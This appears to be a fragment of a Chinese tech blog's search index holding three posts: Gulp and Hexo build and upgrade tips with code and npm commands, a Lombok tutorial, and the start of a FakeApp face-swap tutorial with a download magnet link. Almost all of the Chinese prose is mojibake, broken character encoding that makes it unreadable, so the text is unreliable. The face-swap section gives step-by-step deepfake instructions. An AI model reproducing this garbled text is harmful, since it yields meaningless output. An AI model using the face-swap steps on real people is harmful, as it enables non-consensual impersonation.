æŸå‹ç¼©jpgå›¾ç‰‡ interlaced: false, //æ˜¯å¦éš”è¡Œæ‰«ægifè¿›è¡Œæ¸²æŸ“ svgoPlugins: [{removeViewBox: false}], //æ˜¯å¦ç§»é™¤svgçš„viewboxå±æ€§ multipass: false, //æ˜¯å¦å¤šæ¬¡ä¼˜åŒ–svgç›´åˆ°å®Œå…¨ä¼˜åŒ– optimizationLevel: 5, //ä¼˜åŒ–ç­‰çº§ï¼Œå–å€¼èŒƒå›´ï¼š0-7ï¼Œé»˜è®¤å€¼ï¼š3 use: [pngquant()] //ä½¿ç”¨pngquantæ·±åº¦å‹ç¼©pngå›¾ç‰‡çš„imageminæ’ä»¶ }))) .pipe(gulp.dest('./public/asset')) .pipe(debug({title: 'å‹ç¼©å›¾ç‰‡:'}));});// gulp3çš„å†™æ³•gulp.task('minify-js', ['generate-minify-js', 'copy-minify-js']);gulp.task('minify-css', ['generate-minify-css', 'copy-minify-css']);gulp.task('minify-html', ['generate-minify-html', 'copy-minify-html']); Gulp ç›´æ¥è°ƒç”¨ Hexo-Cli å‘½ä»¤å¦‚æœéœ€è¦ Gulp ç›´æ¥è°ƒç”¨ Hexo çš„å‘½ä»¤ï¼ˆhexo-cliï¼‰ï¼Œå³æ‰§è¡Œ Hexo çš„ cleanã€generateã€serverã€deploy ç­‰æ“ä½œï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var Hexo = require('hexo');var hexo = new Hexo(process.cwd(), {});gulp.task('hexo-clean', function() { return hexo.init().then(function() { return hexo.call('clean', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });});gulp.task('hexo-generate', function() { return hexo.init().then(function() { return hexo.call('generate', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });});gulp.task('hexo-server', function() { return hexo.init().then(function() { return hexo.call('server', {}); }).catch(function(err) { console.log(err); });});gulp.task('hexo-deploy', function() { return hexo.init().then(function() { return hexo.call('deploy', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });}); æ˜¾ç¤º Gulp çš„è¯¦ç»†æ„å»ºæ—¥å¿—ä¿¡æ¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯• Gulp çš„æ„å»ºï¼Œå¯ä»¥å®‰è£… gulp-debug æ¨¡å—ï¼Œç„¶åæ·»åŠ  JS ä»£ç å°†æ„å»ºæ—¥å¿—ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011var debug = require('gulp-debug');gulp.task('minify-js', function() { return gulp.src('./lib/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./build')) .pipe(debug({title: 'å‹ç¼©jsæ–‡ä»¶:'}));}); æ˜¾ç¤º Gulp æ„å»ºå¤±è´¥æ—¶çš„é”™è¯¯æ—¥å¿—ä¿¡æ¯é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœ Gulp æ‰§è¡Œæ„å»ºä»»åŠ¡å‡ºé”™ï¼Œä¸ä¸€å®šéƒ½èƒ½æ˜¾ç¤ºè¯¦ç»†çš„é”™è¯¯æ—¥å¿—ä¿¡æ¯ã€‚ä¸ºäº†æ–¹ä¾¿å®šä½é—®é¢˜ï¼Œå¯ä»¥å®‰è£… gulp-util æ¨¡å—ï¼Œç„¶åæ·»åŠ  JS ä»£ç å°†é”™è¯¯æ—¥å¿—ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213var gutil = require('gulp-util');gulp.task('minify-js', function() { return gulp.src('./lib/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .on('error', function(err) { gutil.log(gutil.colors.red('[Error]'), err.toString()); }) .pipe(gulp.dest('./build'));}); å‡çº§ Gulp çš„ç‰ˆæœ¬Gulp ç‰ˆæœ¬å‡çº§å°† Gulp ä»ç‰ˆæœ¬ 3.9.1 å‡çº§åˆ° 4.0.2ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 123# å…¨å±€å®‰è£…ç‰ˆæœ¬æ£€æµ‹ã€ç‰ˆæœ¬å‡çº§å·¥å…·$ npm install -g npm-check$ npm install -g npm-upgrade 1234567891011121314151617181920# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd /blog-root# æ£€æµ‹Hexoå“ªäº›æ¨¡å—å¯ä»¥å‡çº§$ npm-check# åˆ é™¤package-lock.json# rm -rf package-lock.json# æ›´æ–°package.json$ npm-upgrade# æ›´æ–°Hexoçš„æ¨¡å—$ npm update --save# è‹¥å‡ºç°ä¾èµ–çš„é—®é¢˜ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹ï¼Œç„¶åæŠŠæŠ¥é”™çš„ç»Ÿä¸€ä¿®å¤ä¸€ä¸‹å³å¯$ npm audix# æˆ–è€…å¼ºåˆ¶æ›´æ–°$ npm update --save --force Babel ç‰ˆæœ¬å‡çº§å°† Babel ä»ç‰ˆæœ¬ 6 å‡çº§åˆ° 7ï¼Œå®˜æ–¹ç‰ˆæœ¬å‡çº§è¯´æ˜çœ‹è¿™é‡Œã€‚ 12345# å¸è½½ Babel 6$ npm uninstall babel-core babel-loader babel-preset-env babel-preset-es2015 --save# å®‰è£… Babel 7$ npm install gulp-babel @babel/core @babel/preset-env babel-preset-es2015 babel-core@6 --save è‹¥ Gulp + Babel æ‰§è¡Œæ–‡ä»¶å‹ç¼©æ—¶ï¼Œæç¤º [BABEL] Note: The code generator has deoptimised the styling of \"xxx/xxx.js\" as it exceeds the max of \"500KB\"ï¼Œå¯ä»¥æ·»åŠ  compact\": false å‚æ•°æ¥å¿½ç•¥è¯¥æç¤ºï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789gulp.task('minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(babel({ \"compact\": false, presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./public/lib'));}); Gulp ç‰ˆæœ¬å‡çº§åçš„ä»£ç å…¼å®¹å¤„ç†å½“ Gulp ä»ç‰ˆæœ¬ 3 å‡çº§åˆ° 4 ä¹‹åï¼Œæ‰§è¡Œ Gulp å‘½ä»¤æ—¶è‹¥å‡ºç° Gulp error: The following tasks did not complete: Did you forget to signal async completion? é”™è¯¯ï¼Œåˆ™éœ€è¦å‚è€ƒä»¥ä¸‹æ–¹å¼æ›´æ”¹ä»£ç ã€‚Gulp 4 æœ€å¤§çš„å˜åŒ–å°±æ˜¯ä¸èƒ½åƒä»¥å‰é‚£æ ·ä¼ é€’ä¸€ä¸ªä¾èµ–ä»»åŠ¡åˆ—è¡¨ï¼Œå³ä¸èƒ½å†ç”¨ Gulp3 çš„æ–¹å¼æŒ‡å®šä¾èµ–ä»»åŠ¡ï¼Œéœ€è¦é…åˆä½¿ç”¨ gulp.series å’Œ gulp.parallelï¼Œå› ä¸º Gulp ä»»åŠ¡ç°åœ¨åªæœ‰ä¸¤ä¸ªå‚æ•°ã€‚åœ¨ Gulp4 ä¸­å¿…é¡»æ˜ç¡®é€šçŸ¥ Gulp ä»»åŠ¡å·²ç»å®Œæˆï¼Œè€Œåœ¨ Gulp3 ä¸­ï¼Œé€šå¸¸ä¸å¿…è¦è¿™ä¹ˆåšï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰å‘å‡ºå¼‚æ­¥å®Œæˆä¿¡å·ï¼Œé‚£ä¹ˆå½“ä»»åŠ¡è¿”å›æ—¶ï¼ŒGulp3 ä¼šè®¤ä¸ºå®ƒå·²ç»å®Œæˆã€‚é€šçŸ¥ Gulp ä»»åŠ¡å·²å®Œæˆçš„å¦ä¸€ä¸ªå¸¸è§æ–¹æ³•æ˜¯ Return ä¸€ä¸ªæµæˆ–è€… Promiseï¼Œå¼‚æ­¥ä»»åŠ¡è¿˜å¯ä»¥åˆ©ç”¨å›è°ƒå‡½æ•°æ¥é€šçŸ¥ Gulp ä»»åŠ¡å·²å®Œæˆï¼Œç›¸å…³èµ„æ–™å¯å‚è€ƒè¿™é‡Œã€‚ä¸‹é¢æ˜¯ä½¿ç”¨å›è°ƒå‡½æ•°æ¥é€šçŸ¥ Gulp4 ä»»åŠ¡å·²å®Œæˆçš„ç¤ºä¾‹ä»£ç ï¼š 123456789gulp.task('generate-minify-css', gulp.series(function(cb){ // å¼‚æ­¥æ“ä½œ gulp.src('./public/css/**/*.css') .pipe(changed('/tmp/blog/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(minifycss()) .pipe(gulp.dest('/tmp/blog/css/')) .pipe(debug({title: 'å‹ç¼©cssæºæ–‡ä»¶:'})); cb();})); Gulp ä¸ Babel ç‰ˆæœ¬å‡çº§åçš„å®Œæ•´ä¾èµ–é¡¹1234567891011121314151617\"@babel/core\": \"^7.14.8\",\"@babel/preset-env\": \"^7.14.9\",\"babel-core\": \"^6.26.3\",\"babel-preset-es2015\": \"^6.24.1\",\"gulp\": \"^4.0.2\",\"gulp-babel\": \"^7.0.1\",\"gulp-callback\": \"0.0.3\",\"gulp-changed\": \"^4.0.2\",\"gulp-clean\": \"^0.4.0\",\"gulp-debug\": \"^4.0.0\",\"gulp-htmlclean\": \"^2.7.22\",\"gulp-htmlmin\": \"^5.0.1\",\"gulp-imagemin\": \"^7.1.0\",\"gulp-minify-css\": \"^1.2.4\",\"gulp-uglify\": \"^3.0.2\",\"gulp-util\": \"^3.0.8\",\"imagemin-pngquant\": \"^9.0.2\", å¸¸è§é—®é¢˜å‹ç¼©å›¾ç‰‡å‡ºé”™æ‰§è¡Œ gulp generate-minify-images ä»»åŠ¡ï¼ˆå‹ç¼©å›¾ç‰‡ï¼‰æ—¶ï¼Œç»ˆç«¯è¾“å‡ºå¦‚ä¸‹çš„é”™è¯¯ä¿¡æ¯ï¼š 12345678[13:55:24] Finished 'generate-minify-images' after 1.2 s(node:3702) UnhandledPromiseRejectionWarning: Error: spawn /usr/local/hexo-blog/node_modules/mozjpeg/vendor/cjpeg ENOENT at Process.ChildProcess._handle.onexit (internal/child_process.js:269:19) at onErrorNT (internal/child_process.js:465:16) at processTicksAndRejections (internal/process/task_queues.js:80:21)(Use `node --trace-warnings ...` to show where the warning was created)(node:3702) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). To terminate the node process on unhandled promise rejection, use the CLI flag `--unhandled-rejections=strict` (see https://nodejs.org/api/cli.html#cli_unhandled_rejections_mode). (rejection id: 2)(node:3702) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code. å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥è§£å†³ï¼Œè¿™é‡Œå¼ºçƒˆå»ºè®®åœ¨æœ¬åœ°è¿æ¥ä¸Š VPN åï¼Œå†æ‰§è¡Œ npm install å‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿æ‰€æœ‰ä¸‹è½½çš„æ–‡ä»¶å°±éƒ½æ˜¯å®Œæ•´çš„ 1234567891011121314# æ–‡ä»¶æˆæƒ$ chmod 755 -R ~/.npm# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd /blog-root# åˆ é™¤æ‰€æœ‰æ¨¡å—æ–‡ä»¶$ rm -rf node_modules# é‡å»º$ npm rebuid# å®‰è£…æ¨¡å—$ npm install var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"å…¨æ ˆæŠ€æœ¯é©¿ç«™\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"type\": \"hexo\", \"random\": \"0.9\", \"interval\": \"30\", \"expires\": \"365\", \"height\": \"auto\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"é™æ€åšå®¢ å‰ç«¯"},{title:"Lombok ä½¿ç”¨æ•™ç¨‹",url:"/posts/15ca8348.html",text:'é¡¹ç›®ä¸­ä½¿ç”¨ Lombok é¡¹ç›®æ·»åŠ  Lombok çš„ Maven ä¾èµ–ï¼š 123456&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; IDEA å®‰è£… Lombok æ’ä»¶ï¼š IDEA å¯ç”¨ Annocation Processorsï¼š ä½¿ç”¨ Lombok æä¾›çš„æ³¨è§£ï¼š @Getter @Setter @ToString @EqualsAndHashCode @NonNull @NoArgsConstructor @RequiredArgsConstructor @AllArgsConstructor @Data @Builder @Log @Cleanup @SneakyThrows ä½¿ç”¨ Lombok çš„ä¼˜ç‚¹ å‡å°‘ä»£ç ç»´æŠ¤ï¼šæ–°å¢å±æ€§çš„æ—¶å€™ï¼Œä¼šå‡å°‘éå¸¸å¤šçš„ä»£ç ç»´æŠ¤å·¥ä½œ å‡å°‘æ¨¡æ¿ä»£ç ï¼šLombok å¯¹å¤§é‡çš„æ¨¡æ¿ä»£ç è¿›è¡Œäº†å°è£…ï¼Œå¯ä»¥å‡å°‘é‡å¤ä»£ç  ä½¿ç”¨ Lombok çš„ç¼ºç‚¹ 1) ä¾µå…¥æ€§å¤ªå¼ºï¼šLombok çš„ä½¿ç”¨è¦æ±‚å¼€å‘è€…ä¸€å®šè¦åœ¨ IDE ä¸­å®‰è£…å¯¹åº”çš„æ’ä»¶ï¼Œå¦‚æœé¡¹ç›®ç»„ä¸­ä½¿ç”¨äº† Lombokï¼Œé‚£ä¹ˆæ‰€æœ‰å¼€å‘äººå‘˜éƒ½å¿…é¡»å®‰è£… IDE æ’ä»¶ï¼Œå¦åˆ™å°±æ²¡åŠæ³•ååŒå¼€å‘ã€‚ 2) é™ä½ä»£ç å¯è¯»æ€§ï¼šåœ¨é¡¹ç›®ä¸­ä½¿ç”¨äº† Lombokï¼Œç¡®å®å¯ä»¥å¸®å¿™å‡å°‘å¾ˆå¤šä»£ç ï¼Œä½†æ˜¯è¿™äº›ä»£ç æ˜¯è¦åœ¨ç¼–è¯‘é˜¶æ®µæ‰ä¼šç”Ÿæˆçš„ï¼Œæ‰€ä»¥åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œå…¶å®å¾ˆå¤šä»£ç å…¶å®æ˜¯ç¼ºå¤±çš„ã€‚å¤§é‡ä½¿ç”¨ Lombokï¼Œå°±å¯¼è‡´ä»£ç çš„å¯è¯»æ€§é™ä½ï¼Œè€Œä¸”ä¹Ÿä¼šç»™ä»£ç è°ƒè¯•å¸¦æ¥ä¸€å®šçš„é—®é¢˜ã€‚æ¯”å¦‚ï¼Œæƒ³è¦çŸ¥é“æŸä¸ªç±»ä¸­çš„æŸä¸ªå±æ€§çš„ Getter æ–¹æ³•éƒ½è¢«å“ªäº›ç±»å¼•ç”¨çš„è¯ï¼Œå°±æ²¡é‚£ä¹ˆç®€å•äº†ã€‚ 3) å®¹æ˜“è¸©å‘ï¼šåœ¨ä½¿ç”¨ Lombok è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¯¹äºå„ç§æ³¨è§£çš„åº•å±‚åŸç†ä¸ç†è§£çš„è¯ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿæ„æƒ³ä¸åˆ°çš„ç»“æœã€‚ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå½“ä½¿ç”¨ @Data å®šä¹‰ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬ç”Ÿæˆ equals() æ–¹æ³•ï¼Œä½†æ˜¯å¦‚æœåªä½¿ç”¨äº† @Dataï¼Œè€Œä¸ä½¿ç”¨ @EqualsAndHashCode(callSuper=true) çš„è¯ï¼Œä¼šé»˜è®¤æ˜¯ @EqualsAndHashCode(callSuper=false)ï¼Œè¿™æ—¶å€™ç”Ÿæˆçš„ equals() æ–¹æ³•åªä¼šæ¯”è¾ƒå­ç±»çš„å±æ€§ï¼Œä¸ä¼šè€ƒè™‘ä»çˆ¶ç±»ç»§æ‰¿çš„å±æ€§ï¼Œæ— è®ºçˆ¶ç±»å±æ€§è®¿é—®æƒé™æ˜¯å¦å¼€æ”¾ï¼Œè¿™å°±å¯èƒ½å¾—åˆ°æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚ 4) å½±å“å‡çº§ï¼šå› ä¸º Lombok å¯¹äºä»£ç æœ‰å¾ˆå¼ºçš„ä¾µå…¥æ€§ï¼Œè¿™å°±å¯èƒ½å¸¦æ¥ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯ä¼šå½±å“æ—¥åå¯¹ JDK ç‰ˆæœ¬çš„å‡çº§ã€‚æŒ‰ç…§å¦‚ä»Š JDK çš„å‡çº§é¢‘ç‡ï¼Œæ¯åŠå¹´éƒ½ä¼šæ¨å‡ºä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯ Lombok ä½œä¸ºä¸€ä¸ªç¬¬ä¸‰æ–¹å·¥å…·ï¼Œå¹¶ä¸”æ˜¯ç”±å¼€æºå›¢é˜Ÿç»´æŠ¤çš„ï¼Œé‚£ä¹ˆ Lombok çš„è¿­ä»£é€Ÿåº¦æ˜¯æ— æ³•ä¿è¯çš„ã€‚å¦‚æœæ—¥åéœ€è¦å‡çº§åˆ°æŸä¸ªæ–°ç‰ˆæœ¬ JDK çš„æ—¶å€™ï¼Œè‹¥å…¶ä¸­çš„ç‰¹æ€§åœ¨ Lombok ä¸­ä¸æ”¯æŒçš„è¯å°±ä¼šå—åˆ°å½±å“ã€‚è¿˜æœ‰ä¸€ä¸ªå¯èƒ½å¸¦æ¥çš„é—®é¢˜ï¼Œå°±æ˜¯ Lombok è‡ªèº«çš„å‡çº§ä¹Ÿä¼šå—åˆ°é™åˆ¶ï¼Œå› ä¸ºä¸€ä¸ªåº”ç”¨å¯èƒ½ä¾èµ–äº†å¤šä¸ª Jar åŒ…ï¼Œè€Œæ¯ä¸ª Jar åŒ…å¯èƒ½åˆè¦ä¾èµ–ä¸åŒç‰ˆæœ¬çš„ Lombokï¼Œè¿™å°±å¯¼è‡´åœ¨åº”ç”¨ä¸­éœ€è¦åšç‰ˆæœ¬ä»²è£ï¼Œè€Œ Jar åŒ…ç‰ˆæœ¬ä»²è£æ˜¯æ²¡é‚£ä¹ˆå®¹æ˜“çš„ï¼Œè€Œä¸”å‘ç”Ÿé—®é¢˜çš„æ¦‚ç‡ä¹Ÿå¾ˆé«˜ã€‚ 5) ç ´åå°è£…æ€§ï¼šä½¿ç”¨ Lombok ä¼šç ´åå°è£…æ€§ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼ŒJava çš„ä¸‰å¤§ç‰¹æ€§åŒ…æ‹¬å°è£…æ€§ã€ç»§æ‰¿æ€§å’Œå¤šæ€æ€§ï¼›å¦‚æœåœ¨ä»£ç ä¸­ç›´æ¥ä½¿ç”¨ Lombokï¼Œé‚£ä¹ˆä¼šè‡ªåŠ¨ç”Ÿæˆ Getterã€Setter ç­‰æ–¹æ³•ï¼Œè¿™å°±æ„å‘³ç€ä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰å‚æ•°éƒ½è‡ªåŠ¨æä¾›äº†è®¾ç½®å’Œè¯»å–æ–¹æ³•ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"äººå·¥æ™ºèƒ½è§†é¢‘æ¢è„¸åˆçº§æ•™ç¨‹",url:"/posts/8f51ce11.html",text:'ä¸€äº›è¯´æ˜FBI WARING at 2019.02.06åŸæ–‡ç« å†™äº 2018.02.20ï¼Œå°†è¿‘äº 1 å¹´å‰ï¼Œæ ¹æ®ç§‘æŠ€åœˆçš„è¿›åŒ–è§„å¾‹ï¼Œæœ¬æ–‡æ—©å·²è½ä¼ã€‚è€Œä¸”æœ¬æ–‡çš„æœ¬è´¨æ˜¯åŸºäºä¸€æ¬¾è½¯ä»¶ï¼ˆfakeappï¼‰å†™çš„æ•™ç¨‹ï¼Œå¦‚æœæ— æ³•è·å–è½¯ä»¶ï¼ˆå› ä¸ºå®˜ç½‘æ—©å°±æŒ‚äº†ï¼‰ï¼Œé‚£æœ¬æ–‡å·²æ— ä»»ä½•æ„ä¹‰ã€‚ä¸æ­»å¿ƒçš„å¯ä»¥è¯•ä¸‹ç£åŠ›é“¾æ¥ï¼Œåœ¨èƒ½ä¸‹è½½åˆ° fakeapp çš„å‰æä¸‹ï¼Œå†é˜…è¯»æœ¬æ–‡ã€‚æœ¬æ–‡çš„ fakeapp æ˜¯ 2.0 çš„ç‰ˆæœ¬ï¼Œå…¶ä»–ç‰ˆæœ¬è‡ªæ±‚å¤šç¦ã€‚ ç¯å¢ƒé…ç½®ï¼ŒFakeApp (Windows ä¸“ç”¨)å®˜ç½‘ä¸‹è½½æˆ–ä½¿ç”¨ç£åŠ›é“¾æ¥ (å®˜ç½‘å·²æŒ‚ï¼Œç£åŠ›è‡ªæ±‚å¤šç¦)ï¼Œmagnet:?xt=urn:btih:598F5888522C860D48629EB8EC267496B4322E70 GPU åŠ é€Ÿ (å¼ºçƒˆå»ºè®®)N å¡å»ºè®® GTX1060 èµ·ï¼Œæ˜¾å­˜ 2G ä»¥ä¸Šæ—  N å¡ï¼Œå¯ä»¥ä½¿ç”¨ CPUï¼Œ but very lowå¦‚æœæœ‰ N å¡ï¼Œå»ºè®®ä½¿ç”¨ GPU è®¡ç®—ï¼Œéœ€è¦å…ˆå®‰è£… Nvidia CUDA , å»ºè®®å®‰è£… 8.0 ç‰ˆæœ¬ï¼Œä¸‹è½½åœ°å€ VC åº“ (å¯é€‰)é™„èµ å“ï¼Œå¦‚æœæ“ä½œè¿‡ç¨‹ä¸­æŠ¥é”™äº†ï¼Œå¯ä»¥é€‰æ‹©å®‰è£… VC åº“ï¼Œä¸‹è½½åœ°å€ åŸç†ç®€ä»‹å¦‚ä½•æŠŠ A è§†é¢‘çš„è„¸ï¼Œæ›¿æ¢è¿› B è§†é¢‘ï¼Ÿä¸»è¦åˆ†ä»¥ä¸‹å‡ æ­¥ï¼š 1. æ”¶é›† A,B çš„è„¸å› ä¸ºæ˜¯è§†é¢‘ï¼Œæ‰€ä»¥è¦ç”¨ä¸€äº›ç‰¹æ®Šçš„æŠ€å·§ï¼ŒæŠŠä¸€ä¸ªè§†é¢‘ï¼Œè½¬æ¢æˆä¸€å¼ å¼ å›¾ç‰‡ï¼Œæ¯”å¦‚ 10s çš„è§†é¢‘ï¼Œå¯èƒ½ä¼šæœ‰ä¸Šç™¾å¼ å›¾ç‰‡ï¼Œç„¶ååœ¨ä¸Šç™¾å¼ å›¾ç‰‡é‡Œï¼Œæ‰¾å‡ºå¸¦æœ‰äººè„¸çš„ï¼Œæœ€ç»ˆéƒ½æˆªå–æˆç›¸åŒå¤§å°çš„ï¼Œæ¯”å¦‚ 256*256 çš„è„¸å›¾ç‰‡ 2. è®­ç»ƒæ¨¡å‹ï¼ŒA-&gt;Bæœ‰äº† A çš„ 256*256 è„¸ï¼Œå’Œ B çš„ 256*256 è„¸ï¼Œé€šè¿‡ä¸€äº›ç‰¹æ®Šçš„æŠ€å·§ï¼Œèƒ½æ‰¾åˆ°ä¸¤å¼ è„¸ä¹‹é—´è”ç³»ï¼Œå›¾ç‰‡æ•°è¶Šå¤šï¼Œè”ç³»ä¹Ÿå°±è¶Šç´§ï¼Œæ‰¾åˆ°å…³ç³»åï¼Œä¿å­˜æˆ æ¨¡å‹ã€‚è¿™ä¸ªæ¨¡å‹çš„ä½œç”¨å°±æ˜¯ï¼Œç»™ä¸€å¼  A çš„è„¸ï¼Œè¾“å…¥è¿›æ¨¡å‹ï¼Œæ¨¡å‹ä¼šç»™å‡º B çš„è„¸ 3. æ¢è„¸éšä¾¿æ‰¾ä¸€ä¸ª A çš„è§†é¢‘ï¼Œä¾æ—§æ˜¯è½¬æ¢æˆä¸€å¼ å¼ å›¾ç‰‡ï¼Œä¾æ—§è¦æ‰¾å‡ºå¸¦æœ‰äººè„¸çš„å›¾ç‰‡ã€‚æŠŠè¿™ä¸€å¼ å¼ å›¾ç‰‡ï¼Œä¸¢è¿›ç¬¬ 2 æ­¥å¾—åˆ°çš„æ¨¡å‹ï¼Œå°±èƒ½å¾—å‡ºä¸€å¼ å¼ æ›¿æ¢æˆ B è„¸çš„å›¾ç‰‡ã€‚æœ€åæŠŠæ‰€æœ‰çš„å›¾ç‰‡ï¼Œå†åˆå¹¶æˆè§†é¢‘ï¼Œæ¢è„¸å®Œæˆ FakeApp ä½¿ç”¨åˆ†ä¸‰æ­¥ï¼Œåˆ†åˆ«å¯¹åº”ä¸Šé¢çš„ä¸‰éƒ¨æ›² 1.GetDataSetå°±ä¸€ä¸ªå‚æ•°ï¼Œè¾“å…¥è§†é¢‘çš„è·¯å¾„ã€‚è¿™é‡Œå…¶å®æ˜¯è¦ä¾æ¬¡æ‰§è¡Œ 2 ä¸ªè§†é¢‘ï¼Œä¸€ä¸ª A è§†é¢‘ï¼Œä¸€ä¸ª B è§†é¢‘ï¼Œæ¯”å¦‚ C:\\video\\a.mp4æ‰§è¡Œå®Œæ¯•åï¼Œä¼šåœ¨ c:\\video ç›®å½•ä¸‹ï¼Œç”Ÿæˆ dataset-a ç›®å½•dataset-a ç›®å½•ï¼Œå°±æ˜¯ä¸€å¼ å¼ å›¾ç‰‡ ï¼Œdataset-a é‡Œé¢ï¼Œè¿˜æœ‰ä¸ª extracted ç›®å½•extracted ç›®å½•ï¼Œå°±æ˜¯åªä¿ç•™äººè„¸çš„å›¾ç‰‡ï¼Œå½“ç„¶å¯èƒ½ä¼šæœ‰è¯¯å·®ï¼Œå› ä¸ºæ˜¯ç¨‹åºè‡ªåŠ¨åˆ‡çš„æ³¨æ„ï¼šè¦æµè§ˆ extracted ç›®å½•ï¼Œåªä¿ç•™ 256*256 çš„äººè„¸å›¾ç‰‡ï¼Œå…¶ä»–éƒ½åˆ æ‰æœ€ç»ˆå®Œæˆåï¼Œä¼šæœ‰ dataset-aï¼Œdataset-b ä¸¤ä¸ªç›®å½•ï¼Œé‡Œé¢åˆ†åˆ«æœ‰ extracted ç›®å½• ç¬¬ä¸€æ­¥ä¸»è¦æ˜¯ä»è§†é¢‘é‡Œå–å¾—äººè„¸çš„æ ·æœ¬é›†ã€‚ ç¨‹åºå¯èƒ½ä¼šæŠ¥ Failed to execute script align_facesï¼Œè¿™ç§æƒ…å†µå¯ä»¥å°è¯•å®‰è£… VC åº“ï¼Œæˆ–è€…ä»å…¶ä»–é€”å¾„è·å¾—äººè„¸æ ·æœ¬é›†ï¼Œåªè¦ä¿è¯ 2 å¼ äººè„¸çš„å›¾ç‰‡ï¼Œå¤§å°ä¸€è‡´ 2.Trainæœ‰ä¸‰ä¸ªå‚æ•°ï¼š model å¯ä»¥åœ¨ c:\\video ä¸‹ï¼Œæ–°å»ºä¸ªç›®å½•å« modelï¼Œå°±æ˜¯ç©ºçš„ã€‚é‚£è¿™ä¸ªå‚æ•°ä¸‹å°±è¾“å…¥ c:\\video\\modelï¼Œç”¨æ¥ä¿å­˜æ¨¡å‹çš„ç»“æœ Data A, å¯¹åº”äº†æˆªå–åçš„äººè„¸ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ c:\\video\\dataset-a\\extracted Data Bï¼ŒåŒä¸Šï¼Œæ¢ä¸Š b çš„ä¸‰ä¸ªç›®å½•è¾“å…¥å®Œåï¼Œç‚¹å‡» Trainï¼Œå¼€å§‹æ¼«é•¿çš„ç­‰å¾…ï¼Œä¼šæœ‰ç»“æœæ˜¾ç¤ºï¼Œ Loss Aï¼ŒLoss Bï¼Œä¸€èˆ¬å°äº 0.02ï¼Œå³å¯è®¤ä¸º OKï¼Œè‡ªä¸»åœæ‰ç¨‹åº 3.Createdè¿˜æ˜¯ä¸‰ä¸ªå‚æ•°ï¼š modelï¼ŒåŒä¸Šï¼Œè¾“å…¥è·‘å®Œçš„æ¨¡å‹ç›®å½•ï¼Œä¾ç„¶æ˜¯ c:\\video\\model è¾“å…¥è¦æ¢è„¸çš„è§†é¢‘ï¼Œå¯ä»¥æ‹¿ a è§†é¢‘åšæµ‹è¯• c:\\video\\a.mp4 fpsï¼Œ30 or 24 ï¼Œæ²¡å•¥è¿½æ±‚çš„å°± 24 